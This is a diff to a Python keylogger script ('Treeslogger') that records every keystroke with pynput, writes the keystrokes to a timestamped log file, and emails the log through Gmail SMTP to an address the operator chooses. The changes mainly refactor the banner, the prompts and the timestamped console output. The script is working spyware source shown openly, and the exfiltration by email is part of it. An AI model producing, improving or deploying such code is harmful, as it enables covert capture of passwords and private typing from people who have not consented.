@@ -1,8 +1,5 @@
 #!/usr/bin/env python3
-#importing nessesary modules
-import email
-import smtplib
-import ssl
+import email, smtplib, ssl
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
@@ -11,29 +8,35 @@ from datetime import datetime
 from pynput import keyboard
 from colorama import Fore, Style
 
-#Tool Banner
-print(Fore.RED + """
- ______             __
-(  /               ( /                  """ + Fore.WHITE + "v1.0")
-print(Fore.RED + """  /_   _  _  (      /    __ _,  _,  _  _
-_// (_(/_(/_/_)_  (/___/(_)(_)_(_)_(/_/ (_ 
-                            /|  /| """)
-print(Fore.WHITE + "---------------------------" + Fore.RED + "(/" + Fore.WHITE + "--" + Fore.RED + "(/" + Fore.WHITE + "--------")
+#Banner
+print(Fore.RED + " ______             __")
+print(Fore.RED + "(  /               ( /                  " + Fore.WHITE + "v1.0")
+print(Fore.RED + "  /_   _  _  (      /    __ _,  _,  _  _")
+print(Fore.RED + "_// (_(/_(/_/_)_  (/___/(_)(_)_(_)_(/_/ (_ ")
+print(Fore.RED + "                            /|  /|") 
+print(Fore.WHITE + "---------------------------" + Fore.RED + "(/" + Fore.WHITE + "--" + Fore.RED + "(/" + Fore.WHITE + "---------------")
+
+#Capture the variables for File Naming and use with the UI
+time = datetime.now().strftime("%d-%m-Y%_%H:%M:%S%p")
+time_as_string = str(time)
+timestamp = datetime.now().strftime("[%H:%M:%S %p]")
+timestamp_as_string = str(timestamp)
+colored_prompt = "[" + Fore.GREEN + "*" + Fore.WHITE + "]"
 
 #Prompt for Email Information
-sender_email = input("[*]Please enter your gmail address: ")
-password = input("[*]Please enter your gmail password: ")
-receiver_email = input("[*]Please enter email to recieve logs: ")
+sender_email = input(f"{colored_prompt} Please enter your gmail address:     ")
+password = input(f"{colored_prompt} Please enter your gmail password:    ")
+receiver_email = input(f"{colored_prompt} Please enter email to recieve logs:  ")
 
 #Create a function to log each keypress.
 #Include a series of logical operators replacing common keys with more readable formatting.
 #(Default pynput output is very verbose)
 def on_release(key):
-	print(key) #Comment out this line if you don't want to see the keypresses live in the terminal
+	print(Fore.RED + f"{timestamp_as_string}" + Fore.WHITE + f" Keystroke Logged!: {key}")
 	if key == keyboard.Key.space:
 		key = " <SPACEBAR> "
 	elif key == keyboard.Key.enter:
-		key = "\n "
+		key = " <ENTER> \n "
 	elif key == keyboard.Key.backspace:
 		key = " <BACKSPACE> "
 	elif key == keyboard.Key.up:
@@ -112,28 +115,25 @@ def on_release(key):
 		key = " <BREAK> "
 	f.write(str(key).replace("'", ""))
 
-#Capture the datetime for File Naming
-time = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
-time_as_string = str(time)
-
 #Start the listener
 listener = keyboard.Listener(on_release=on_release)
 listener.start()
-print("[" + Fore.GREEN + "*" + Fore.WHITE + "] Listener Started. Script is active.")
-print("[" + Fore.GREEN + "*" + Fore.WHITE + "] Beginning Keypress Livestream.")
-print("[" + Fore.GREEN + "*" + Fore.WHITE + "] Press Ctrl & C at any time to stop execution.")
+print(f"{colored_prompt} Listener Started. Script is active.")
+print(f"{colored_prompt} Beginning Keypress Livestream.")
+print(f"{colored_prompt} Press Ctrl & C at any time to stop execution.")
+print(Fore.RED + "-------------" + Fore.WHITE + "LOGGING-KEYSTROKES" + Fore.RED + "----------------")
 #Keep the file and listener open with an infinite loop.
 while True:
 	try:
 		i=0
 		f = open("logs/" + time_as_string + ".txt", "a")
 	except KeyboardInterrupt:
-		print("\n[" + Fore.GREEN + "*" + Fore.WHITE + "] Exiting Keylogger!")
+		print(f"\n{colored_prompt} Exiting Keylogger!")
 		break
 
 #Adding additional email variables
-subject = "Keylogger Update"
-body = "Hi. Please find attatched your keylogger report."
+subject = f"Treeslogger Update {time_as_string}"
+body = f"Hi. Please find attatched your keylogger report for {time_as_string}."
 
 #create a multipart message and set headers
 message = MIMEMultipart()
@@ -169,5 +169,5 @@ with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
     server.login(sender_email, password)
     server.sendmail(sender_email, receiver_email, text)
 #Print a confirmation message and close the file
-print(f"[" + Fore.GREEN + "*" + Fore.WHITE + "] Your logs have been sent to " + receiver_email + ".")
+print(f"{colored_prompt} Your logs have been sent to " + receiver_email + ".")
 f.close()
